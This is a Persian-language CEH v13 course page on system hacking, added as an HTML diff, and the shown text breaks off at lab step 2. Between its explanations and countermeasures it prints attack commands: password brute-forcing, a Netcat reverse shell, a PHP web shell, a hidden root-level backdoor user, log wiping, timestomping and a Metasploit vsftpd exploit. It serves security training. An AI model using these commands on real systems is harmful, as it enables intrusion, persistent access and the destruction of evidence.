@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ماژول ۶ - System Hacking - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .toc {
+            background: #eef3f7;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border-right: 4px solid #2a7de1;
+        }
+        .toc ul {
+            columns: 2;
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .toc ul li {
+            margin: 6px 0;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .toc ul li:hover {
+            background: #dce3ea;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+        .copy-btn {
+            background: #2a7de1;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1a5fb0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #4a5a7a;
+        }
+        .code-block .copy-btn:hover {
+            background: #2a7de1;
+        }
+        @media (max-width: 768px) {
+            .toc ul { columns: 1; }
+        }
+        table tr:hover {
+            background: #e8f0fe !important;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../index.html">ماژول‌ها</a>
+        </span>
+    </div>
+
+    <h1>📚 ماژول ۶ – System Hacking</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – System Hacking چیست؟</a></li>
+            <li><a href="#system-hacking-cycle">🔄 چرخه System Hacking</a></li>
+            <li><a href="#password-cracking">🔑 کرک پسورد (Password Cracking)</a></li>
+            <li><a href="#password-attacks">🎯 انواع حملات به پسورد</a></li>
+            <li><a href="#password-tools">🛠️ ابزارهای کرک پسورد</a></li>
+            <li><a href="#privilege-escalation">📈 افزایش دسترسی (Privilege Escalation)</a></li>
+            <li><a href="#maintaining-access">🔗 حفظ دسترسی (Maintaining Access)</a></li>
+            <li><a href="#covering-tracks">🧹 پاک کردن ردپا (Covering Tracks)</a></li>
+            <li><a href="#steganography">🖼️ پنهان‌سازی (Steganography)</a></li>
+            <li><a href="#ai-system-hacking">🤖 System Hacking با هوش مصنوعی</a></li>
+            <li><a href="#countermeasures">🛡️ راه‌های مقابله با System Hacking</a></li>
+            <li><a href="#lab-exercise">🧪 کارگاه عملی</a></li>
+            <li><a href="#practice-exercises">📝 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – System Hacking چیست؟</h2>
+        <p>
+            <b>System Hacking (هک سیستم)</b> پنجمین و یکی از مهم‌ترین مراحل چرخه هک قانونمند است که پس از <b>تحلیل آسیب‌پذیری</b> انجام می‌شود. در این مرحله، هکر با استفاده از آسیب‌پذیری‌های شناسایی شده، سعی می‌کند به سیستم هدف نفوذ کرده و کنترل آن را به دست آورد.
+        </p>
+        <p>
+            System Hacking شامل مجموعه‌ای از تکنیک‌ها و مراحل است که به هکر امکان می‌دهد:
+        </p>
+        <ul>
+            <li><b>دسترسی (Gaining Access):</b> نفوذ به سیستم با استفاده از آسیب‌پذیری‌ها.</li>
+            <li><b>افزایش دسترسی (Privilege Escalation):</b> به‌دست آوردن سطح دسترسی بالاتر (معمولاً root/admin).</li>
+            <li><b>حفظ دسترسی (Maintaining Access):</b> ایجاد راه‌های بازگشت به سیستم.</li>
+            <li><b>پاک کردن ردپا (Covering Tracks):</b> حذف آثار حمله برای جلوگیری از شناسایی.</li>
+        </ul>
+        <div class="tip-box">
+            <b>💡 نکته مهم:</b> System Hacking قلب تپنده هک است. تمام مراحل قبلی (شناسایی، اسکن، شمارش، تحلیل آسیب‌پذیری) برای موفقیت در این مرحله انجام می‌شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: چرخه System Hacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="system-hacking-cycle">
+        <h2>🔄 چرخه System Hacking</h2>
+        <p>
+            چرخه System Hacking شامل چهار مرحله اصلی است که هکر برای نفوذ و کنترل یک سیستم طی می‌کند:
+        </p>
+
+        <h3>🔓 ۱. دسترسی (Gaining Access)</h3>
+        <ul>
+            <li><b>هدف:</b> نفوذ به سیستم از طریق آسیب‌پذیری‌های شناسایی شده.</li>
+            <li><b>روش‌ها:</b> کرک پسورد، تزریق SQL، سرریز بافر، مهندسی اجتماعی، بهره‌برداری از آسیب‌پذیری‌های شناخته‌شده.</li>
+            <li><b>نتیجه:</b> دسترسی به سیستم با سطح دسترسی محدود (معمولاً کاربر عادی).</li>
+        </ul>
+
+        <h3>📈 ۲. افزایش دسترسی (Privilege Escalation)</h3>
+        <ul>
+            <li><b>هدف:</b> به‌دست آوردن دسترسی root/admin یا سطح دسترسی بالاتر.</li>
+            <li><b>روش‌ها:</b> بهره‌برداری از آسیب‌پذیری‌های محلی، سوءاستفاده از تنظیمات اشتباه، کرک پسورد مدیر.</li>
+            <li><b>نتیجه:</b> کنترل کامل بر سیستم.</li>
+        </ul>
+
+        <h3>🔗 ۳. حفظ دسترسی (Maintaining Access)</h3>
+        <ul>
+            <li><b>هدف:</b> ایجاد دسترسی پایدار برای حملات آینده.</li>
+            <li><b>روش‌ها:</b> نصب درب پشتی (Backdoor)، روت‌کیت (Rootkit)، ایجاد کاربران مخفی.</li>
+            <li><b>نتیجه:</b> امکان بازگشت به سیستم در هر زمان.</li>
+        </ul>
+
+        <h3>🧹 ۴. پاک کردن ردپا (Covering Tracks)</h3>
+        <ul>
+            <li><b>هدف:</b> حذف آثار حمله برای جلوگیری از شناسایی.</li>
+            <li><b>روش‌ها:</b> پاک کردن لاگ‌ها، تغییر زمان‌ها، پنهان‌سازی فایل‌ها و فرآیندها.</li>
+            <li><b>نتیجه:</b> مخفی‌ماندن حمله و جلوگیری از پیگرد قانونی.</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> چرخه System Hacking یک فرآیند چرخه‌ای است و هکر ممکن است بارها بین مراحل مختلف حرکت کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: کرک پسورد -->
+    <!-- ============================================================ -->
+    <div class="card" id="password-cracking">
+        <h2>🔑 کرک پسورد (Password Cracking)</h2>
+        <p>
+            <b>کرک پسورد</b> یکی از رایج‌ترین روش‌های دسترسی به سیستم است. در این روش، هکر سعی می‌کند با استفاده از ابزارها و تکنیک‌های مختلف، رمز عبور کاربران را پیدا کند.
+        </p>
+
+        <h3>📌 انواع حملات به پسورد:</h3>
+        <ul>
+            <li><b>حمله دیکشنری (Dictionary Attack):</b> استفاده از یک لیست از کلمات رایج برای حدس رمز.</li>
+            <li><b>حمله Brute-Force:</b> امتحان تمام ترکیب‌های ممکن کاراکترها.</li>
+            <li><b>حمله ترکیبی (Hybrid Attack):</b> ترکیب دیکشنری با تغییرات (مثل اضافه کردن اعداد).</li>
+            <li><b>حمله جدول رنگین‌کمانی (Rainbow Table Attack):</b> استفاده از جداول از پیش محاسبه‌شده برای هش‌ها.</li>
+            <li><b>حمله شنود (Sniffing):</b> شنود ترافیک شبکه برای دریافت رمز عبور.</li>
+            <li><b>حمله مهندسی اجتماعی:</b> فریب کاربر برای افشای رمز.</li>
+            <li><b>حمله Shoulder Surfing:</b> مشاهده مستقیم صفحه‌کلید کاربر.</li>
+        </ul>
+
+        <h3>📌 مراحل کرک پسورد:</h3>
+        <ol>
+            <li><b>جمع‌آوری هش‌ها:</b> دریافت فایل هش پسوردها (مثل /etc/shadow در لینوکس یا SAM در ویندوز).</li>
+            <li><b>انتخاب روش حمله:</b> انتخاب روش مناسب بر اساس نوع هش و منابع موجود.</li>
+            <li><b>اجرای حمله:</b> استفاده از ابزارهای کرک برای پیدا کردن رمز.</li>
+            <li><b>تأیید رمز:</b> تست رمز پیدا شده برای ورود به سیستم.</li>
+        </ol>
+
+        <div class="warning-box">
+            <b>⚠️ نکته اخلاقی:</b> کرک پسورد بدون مجوز جرم است. در هک قانونمند، این کار فقط با مجوز و در محیط‌های کنترل‌شده انجام می‌شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: انواع حملات به پسورد -->
+    <!-- ============================================================ -->
+    <div class="card" id="password-attacks">
+        <h2>🎯 انواع حملات به پسورد (Password Attacks)</h2>
+        <p>
+            در ادامه، مهم‌ترین حملات به پسورد را با جزئیات بیشتری بررسی می‌کنیم:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>نوع حمله</th><th>توضیح</th><th>مزایا</th><th>معایب</th></tr>
+                <tr>
+                    <td><b>دیکشنری</b></td>
+                    <td>استفاده از لیست کلمات رایج</td>
+                    <td>سریع و ساده</td>
+                    <td>فقط رمزهای ضعیف را پیدا می‌کند</td>
+                </tr>
+                <tr>
+                    <td><b>Brute-Force</b></td>
+                    <td>امتحان تمام ترکیب‌های ممکن</td>
+                    <td>همه رمزها را پیدا می‌کند</td>
+                    <td>بسیار کند و زمان‌بر</td>
+                </tr>
+                <tr>
+                    <td><b>ترکیبی</b></td>
+                    <td>دیکشنری + تغییرات</td>
+                    <td>تعادل بین سرعت و دقت</td>
+                    <td>نیاز به منابع بیشتر از دیکشنری</td>
+                </tr>
+                <tr>
+                    <td><b>Rainbow Table</b></td>
+                    <td>جداول از پیش محاسبه‌شده</td>
+                    <td>بسیار سریع</td>
+                    <td>نیاز به فضای ذخیره‌سازی زیاد</td>
+                </tr>
+                <tr>
+                    <td><b>Sniffing</b></td>
+                    <td>شنود ترافیک شبکه</td>
+                    <td>غیرفعال و مخفی</td>
+                    <td>فقط در شبکه‌های غیرامن کار می‌کند</td>
+                </tr>
+                <tr>
+                    <td><b>مهندسی اجتماعی</b></td>
+                    <td>فریب کاربر</td>
+                    <td>بسیار مؤثر</td>
+                    <td>نیاز به مهارت ارتباطی</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> بهترین دفاع در برابر حملات پسورد، استفاده از رمزهای عبور قوی (طولانی، شامل حروف بزرگ و کوچک، اعداد و نمادها) و احراز هویت چندعاملی (MFA) است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: ابزارهای کرک پسورد -->
+    <!-- ============================================================ -->
+    <div class="card" id="password-tools">
+        <h2>🛠️ ابزارهای کرک پسورد</h2>
+        <p>
+            ابزارهای متعددی برای کرک پسورد وجود دارند که هر کدام ویژگی‌ها و کاربردهای خاص خود را دارند:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>سیستم‌عامل هدف</th><th>نوع حمله</th><th>ویژگی‌ها</th></tr>
+                <tr>
+                    <td><b>John the Ripper</b></td>
+                    <td>لینوکس، ویندوز، macOS</td>
+                    <td>دیکشنری، Brute-Force، Rainbow</td>
+                    <td>قدرتمند، پشتیبانی از انواع هش، متن‌باز</td>
+                </tr>
+                <tr>
+                    <td><b>Hashcat</b></td>
+                    <td>لینوکس، ویندوز، macOS</td>
+                    <td>Brute-Force، دیکشنری، ترکیبی، ماسک</td>
+                    <td>سریع‌ترین ابزار، پشتیبانی از GPU، بیش از ۳۰۰ نوع هش</td>
+                </tr>
+                <tr>
+                    <td><b>Hydra</b></td>
+                    <td>لینوکس، ویندوز، macOS</td>
+                    <td>Brute-Force به سرویس‌های شبکه</td>
+                    <td>پشتیبانی از SSH, FTP, HTTP, RDP و …</td>
+                </tr>
+                <tr>
+                    <td><b>Medusa</b></td>
+                    <td>لینوکس، ویندوز</td>
+                    <td>Brute-Force به سرویس‌های شبکه</td>
+                    <td>مشابه Hydra، با قابلیت موازی‌سازی</td>
+                </tr>
+                <tr>
+                    <td><b>Ncrack</b></td>
+                    <td>لینوکس، ویندوز، macOS</td>
+                    <td>Brute-Force به سرویس‌های شبکه</td>
+                    <td>سریع، پشتیبانی از پروتکل‌های مختلف</td>
+                </tr>
+                <tr>
+                    <td><b>RainbowCrack</b></td>
+                    <td>لینوکس، ویندوز</td>
+                    <td>Rainbow Table</td>
+                    <td>تولید و استفاده از جداول رنگین‌کمانی</td>
+                </tr>
+                <tr>
+                    <td><b>Cain & Abel</b></td>
+                    <td>ویندوز</td>
+                    <td>Sniffing، کرک، تحلیل</td>
+                    <td>رابط گرافیکی، مناسب برای ویندوز</td>
+                </tr>
+                <tr>
+                    <td><b>Ophcrack</b></td>
+                    <td>ویندوز</td>
+                    <td>Rainbow Table</td>
+                    <td>مخصوص کرک پسوردهای ویندوز</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># John the Ripper – کرک فایل shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+
+# Hashcat – کرک هش MD5
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Hydra – Brute-Force SSH
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
+
+# Ncrack – Brute-Force RDP
+ncrack -U users.txt -P pass.txt rdp://192.168.1.101</code></pre>
+        </div>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> Hashcat به دلیل پشتیبانی از GPU، سریع‌ترین ابزار کرک پسورد است و می‌تواند میلیاردها ترکیب را در ثانیه تست کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: افزایش دسترسی -->
+    <!-- ============================================================ -->
+    <div class="card" id="privilege-escalation">
+        <h2>📈 افزایش دسترسی (Privilege Escalation)</h2>
+        <p>
+            پس از نفوذ اولیه به سیستم، هکر معمولاً دسترسی محدودی دارد (معمولاً یک کاربر عادی). <b>افزایش دسترسی (Privilege Escalation)</b> فرآیندی است که در آن هکر سعی می‌کند سطح دسترسی خود را به root/admin افزایش دهد.
+        </p>
+
+        <h3>📌 دو نوع افزایش دسترسی:</h3>
+        <ul>
+            <li><b>افقی (Horizontal):</b> دسترسی به حساب کاربری دیگر با همان سطح دسترسی (مثلاً کاربر دیگر).</li>
+            <li><b>عمودی (Vertical):</b> افزایش سطح دسترسی به root/admin.</li>
+        </ul>
+
+        <h3>📌 روش‌های افزایش دسترسی:</h3>
+        <ul>
+            <li><b>بهره‌برداری از آسیب‌پذیری‌های محلی:</b> استفاده از آسیب‌پذیری‌های موجود در سیستم‌عامل یا برنامه‌ها.</li>
+            <li><b>سوءاستفاده از تنظیمات اشتباه:</b> پیدا کردن فایل‌ها یا سرویس‌هایی که با دسترسی بالا اجرا می‌شوند.</li>
+            <li><b>کرک پسورد مدیر:</b> پیدا کردن رمز عبور کاربر root/admin.</li>
+            <li><b>سوءاستفاده از Sudo:</b> اگر کاربر مجوز اجرای دستورات خاصی با sudo را داشته باشد.</li>
+            <li><b>سوءاستفاده از Cron Jobs:</b> پیدا کردن اسکریپت‌هایی که با دسترسی root اجرا می‌شوند.</li>
+            <li><b>سوءاستفاده از Docker یا LXC:</b> در صورت وجود کانتینرها با دسترسی root.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># بررسی مجوزهای sudo
+sudo -l
+
+# جستجوی فایل‌های با SUID
+find / -perm -4000 -type f 2>/dev/null
+
+# جستجوی فایل‌های با SGID
+find / -perm -2000 -type f 2>/dev/null
+
+# بررسی Cron Jobs
+cat /etc/crontab
+ls -la /etc/cron.d/
+
+# استفاده از ابزارهای خودکار مانند LinPEAS, WinPEAS
+# (برای ویندوز) winpeas.exe
+# (برای لینوکس) linpeas.sh</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ نکته:</b> افزایش دسترسی یکی از خطرناک‌ترین مراحل است، زیرا ممکن است باعث شناسایی هکر شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: حفظ دسترسی -->
+    <!-- ============================================================ -->
+    <div class="card" id="maintaining-access">
+        <h2>🔗 حفظ دسترسی (Maintaining Access)</h2>
+        <p>
+            پس از به‌دست آوردن دسترسی root/admin، هکر باید راهی برای بازگشت به سیستم ایجاد کند. این کار با نصب <b>درب پشتی (Backdoor)</b> یا <b>روت‌کیت (Rootkit)</b> انجام می‌شود.
+        </p>
+
+        <h3>📌 انواع درب پشتی:</h3>
+        <ul>
+            <li><b>شل معکوس (Reverse Shell):</b> سیستم هدف به سرور هکر متصل می‌شود.</li>
+            <li><b>بایند شل (Bind Shell):</b> یک پورت روی سیستم هدف باز می‌شود و هکر به آن متصل می‌شود.</li>
+            <li><b>Web Shell:</b> یک فایل PHP/ASP که به هکر اجازه می‌دهد از طریق مرورگر به سیستم دسترسی داشته باشد.</li>
+            <li><b>SSH Backdoor:</b> ایجاد یک کاربر مخفی با دسترسی SSH.</li>
+            <li><b>خدمات مخفی:</b> نصب یک سرویس که در پس‌زمینه اجرا می‌شود.</li>
+        </ul>
+
+        <h3>📌 روت‌کیت (Rootkit):</h3>
+        <ul>
+            <li><b>تعریف:</b> مجموعه‌ای از ابزارها برای پنهان‌سازی و حفظ دسترسی.</li>
+            <li><b>انواع:</b> روت‌کیت‌های سطح کاربر، هسته، و بوت‌کیت.</li>
+            <li><b>کاربرد:</b> پنهان‌سازی فایل‌ها، فرآیندها، لاگ‌ها و اتصالات شبکه.</li>
+            <li><b>ابزارها:</b> Kbeast, SucKIT, Rootkit Hunter (برای تشخیص).</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ایجاد شل معکوس با Netcat (سمت هکر)
+nc -lvnp 4444
+
+# سمت هدف (با دسترسی root)
+nc -e /bin/bash 192.168.1.100 4444
+
+# ایجاد Web Shell (PHP)
+<?php system($_GET['cmd']); ?>
+
+# ایجاد کاربر مخفی در لینوکس
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash hacker
+echo "hacker:password" | chpasswd</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> روت‌کیت‌ها بسیار خطرناک هستند و می‌توانند امنیت سیستم را به شدت به خطر بیندازند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: پاک کردن ردپا -->
+    <!-- ============================================================ -->
+    <div class="card" id="covering-tracks">
+        <h2>🧹 پاک کردن ردپا (Covering Tracks)</h2>
+        <p>
+            آخرین مرحله System Hacking، <b>پاک کردن ردپا</b> است. هکر باید تمام آثار خود را از سیستم پاک کند تا توسط مدیران یا سیستم‌های تشخیص نفوذ شناسایی نشود.
+        </p>
+
+        <h3>📌 روش‌های پاک کردن ردپا:</h3>
+        <ul>
+            <li><b>پاک کردن لاگ‌ها:</b> حذف یا تغییر لاگ‌های سیستم (مثل /var/log/ در لینوکس و Event Viewer در ویندوز).</li>
+            <li><b>تغییر زمان‌ها:</b> تغییر زمان دسترسی و تغییر فایل‌ها.</li>
+            <li><b>پنهان‌سازی فایل‌ها:</b> تغییر نام، تغییر پسوند، یا استفاده از ابزارهای Steganography.</li>
+            <li><b>پنهان‌سازی فرآیندها:</b> استفاده از روت‌کیت برای پنهان کردن فرآیندها.</li>
+            <li><b>پاک کردن تاریخچه دستورات:</b> حذف تاریخچه ترمینال (مثل history -c).</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># پاک کردن لاگ‌های لینوکس
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > /var/log/messages
+
+# پاک کردن تاریخچه دستورات
+history -c
+rm -f ~/.bash_history
+
+# پاک کردن لاگ‌های ویندوز (با PowerShell)
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# تغییر زمان فایل
+touch -t 202501011200 file.txt</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> در هک قانونمند، پاک کردن ردپا فقط در محیط‌های آزمایشگاهی انجام می‌شود و در تست‌های واقعی، تمام آثار باید مستند شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: پنهان‌سازی -->
+    <!-- ============================================================ -->
+    <div class="card" id="steganography">
+        <h2>🖼️ پنهان‌سازی (Steganography)</h2>
+        <p>
+            <b>Steganography</b> هنر پنهان‌سازی اطلاعات درون فایل‌های دیگر (مثل تصاویر، صدا، ویدئو) است. این تکنیک برای انتقال اطلاعات به‌صورت مخفیانه استفاده می‌شود.
+        </p>
+
+        <h3>📌 انواع Steganography:</h3>
+        <ul>
+            <li><b>تصویری (Image):</b> پنهان‌سازی داده درون تصاویر (JPG, PNG, BMP).</li>
+            <li><b>صوتی (Audio):</b> پنهان‌سازی درون فایل‌های صوتی (MP3, WAV).</li>
+            <li><b>ویدیویی (Video):</b> پنهان‌سازی درون فایل‌های ویدیویی.</li>
+            <li><b>متنی (Text):</b> پنهان‌سازی درون فایل‌های متنی (با تغییر فاصله‌ها، حروف).</li>
+            <li><b>شبکه‌ای (Network):</b> پنهان‌سازی درون بسته‌های شبکه.</li>
+        </ul>
+
+        <h3>📌 ابزارهای Steganography:</h3>
+        <ul>
+            <li><b>Steghide:</b> پنهان‌سازی و استخراج داده درون تصاویر و صدا.</li>
+            <li><b>Outguess:</b> پنهان‌سازی درون تصاویر JPEG.</li>
+            <li><b>OpenStego:</b> ابزار متن‌باز برای Steganography.</li>
+            <li><b>StegOnline:</b> ابزار آنلاین برای تحلیل و تشخیص Steganography.</li>
+            <li><b>Snow:</b> پنهان‌سازی درون فایل‌های متنی با استفاده از فاصله‌ها.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># نصب steghide
+sudo apt install steghide
+
+# پنهان‌سازی یک فایل درون تصویر
+steghide embed -cf image.jpg -ef secret.txt -sf output.jpg
+
+# استخراج فایل از تصویر
+steghide extract -sf output.jpg
+
+# استفاده از Snow برای پنهان‌سازی در متن
+snow -C -m "secret message" input.txt output.txt</code></pre>
+        </div>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> Steganography یک ابزار قدرتمند برای جاسوسی و انتقال اطلاعات محرمانه است، اما در هک قانونمند فقط برای آزمایش و آموزش استفاده می‌شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: System Hacking با هوش مصنوعی -->
+    <!-- ============================================================ -->
+    <div class="card" id="ai-system-hacking">
+        <h2>🤖 System Hacking با هوش مصنوعی</h2>
+        <p>
+            CEH v13 به عنوان <b>اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده</b>، ابزارها و تکنیک‌های مبتنی بر AI را برای System Hacking نیز معرفی می‌کند.
+        </p>
+
+        <h3>📌 نقش هوش مصنوعی در System Hacking:</h3>
+        <ul>
+            <li><b>بهینه‌سازی کرک پسورد:</b> AI می‌تواند الگوهای رمزهای عبور را تحلیل کرده و حملات هوشمندتری انجام دهد.</li>
+            <li><b>تشخیص خودکار آسیب‌پذیری‌ها:</b> AI می‌تواند به‌صورت خودکار آسیب‌پذیری‌های محلی را برای افزایش دسترسی شناسایی کند.</li>
+            <li><b>اتوماسیون حفظ دسترسی:</b> AI می‌تواند بهترین روش حفظ دسترسی را بر اساس محیط هدف انتخاب کند.</li>
+            <li><b>پاک کردن هوشمند ردپا:</b> AI می‌تواند لاگ‌ها و آثار حمله را به‌صورت هوشمندانه پاک کند.</li>
+        </ul>
+
+        <h3>📌 ابزارهای AI-Powered System Hacking:</h3>
+        <ul>
+            <li><b>AI-Powered Password Cracking:</b> ابزارهایی که از یادگیری ماشین برای کرک پسورد استفاده می‌کنند.</li>
+            <li><b>AI-Based Privilege Escalation:</b> ابزارهایی که به‌صورت خودکار راه‌های افزایش دسترسی را پیدا می‌کنند.</li>
+            <li><b>AI-Driven Backdoor Generation:</b> تولید درب‌های پشتی هوشمند.</li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 چرا هوش مصنوعی در System Hacking مهم است؟</b>
+            <p>
+                System Hacking با AI می‌تواند سرعت و دقت حملات را افزایش دهد و روش‌های پیشرفته‌تری را برای نفوذ و حفظ دسترسی ارائه دهد.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: راه‌های مقابله با System Hacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="countermeasures">
+        <h2>🛡️ راه‌های مقابله با System Hacking</h2>
+        <p>
+            برای جلوگیری از System Hacking، سازمان‌ها باید اقدامات زیر را انجام دهند:
+        </p>
+
+        <h3>📌 اقدامات کلی:</h3>
+        <ul>
+            <li><b>استفاده از رمزهای عبور قوی:</b> طولانی، شامل حروف بزرگ و کوچک، اعداد و نمادها.</li>
+            <li><b>احراز هویت چندعاملی (MFA):</b> اضافه کردن لایه‌های امنیتی بیشتر.</li>
+            <li><b>به‌روزرسانی منظم سیستم‌ها:</b> نصب وصله‌های امنیتی.</li>
+            <li><b>محدود کردن دسترسی:</b> اصل کمترین دسترسی (Least Privilege).</li>
+            <li><b>مانیتورینگ و لاگ‌گیری:</b> ثبت و بررسی فعالیت‌های سیستم.</li>
+            <li><b>آموزش کارکنان:</b> آگاهی‌بخشی درباره مهندسی اجتماعی و امنیت.</li>
+        </ul>
+
+        <h3>📌 اقدامات خاص:</h3>
+        <ul>
+            <li><b>در برابر کرک پسورد:</b> استفاده از سالت (Salt) در هش‌ها، محدود کردن تعداد تلاش‌های ناموفق.</li>
+            <li><b>در برابر افزایش دسترسی:</b> پیکربندی صحیح sudo، محدود کردن SUID/SGID.</li>
+            <li><b>در برابر حفظ دسترسی:</b> استفاده از آنتی‌روت‌کیت، بررسی منظم سیستم.</li>
+            <li><b>در برابر پاک کردن ردپا:</b> ذخیره لاگ‌ها در یک سرور امن، استفاده از SIEM.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> هیچ سیستمی ۱۰۰٪ ایمن نیست، اما با اعمال این کنترل‌ها می‌توان ریسک را به شدت کاهش داد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: کارگاه عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="lab-exercise">
+        <h2>🧪 کارگاه عملی – System Hacking</h2>
+        <p>
+            در این کارگاه، شما یک سناریوی جامع System Hacking را روی یک هدف فرضی پیاده‌سازی می‌کنید. هدف این کارگاه، آشنایی عملی با تکنیک‌ها و ابزارهای System Hacking است.
+        </p>
+
+        <h3>🎯 هدف کارگاه:</h3>
+        <ul>
+            <li>نفوذ به سیستم با استفاده از یک آسیب‌پذیری.</li>
+            <li>کرک پسورد یک کاربر.</li>
+            <li>افزایش دسترسی به root.</li>
+            <li>نصب یک درب پشتی.</li>
+            <li>پاک کردن ردپا.</li>
+        </ul>
+
+        <h3>🖥️ محیط مورد نیاز:</h3>
+        <ul>
+            <li><b>حمله‌کننده:</b> Kali Linux</li>
+            <li><b>هدف:</b> Metasploitable 2</li>
+            <li><b>ابزارها:</b> Nmap, Hydra, John the Ripper, Metasploit, Netcat</li>
+        </ul>
+
+        <h3>📝 سناریوی گام‌به‌گام:</h3>
+
+        <h4>مرحله ۱: شناسایی و اسکن</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن پورت‌ها
+nmap -sV -p- 192.168.1.101</code></pre>
+        </div>
+        <p><b>تحلیل:</b> پورت‌های باز مانند 21 (FTP), 22 (SSH), 80 (HTTP) را شناسایی کنید.</p>
+
+        <h4>مرحله ۲: نفوذ از طریق FTP (vsftpd backdoor)</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Metasploit
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.1.101
+exploit</code></pre>
+        </div>
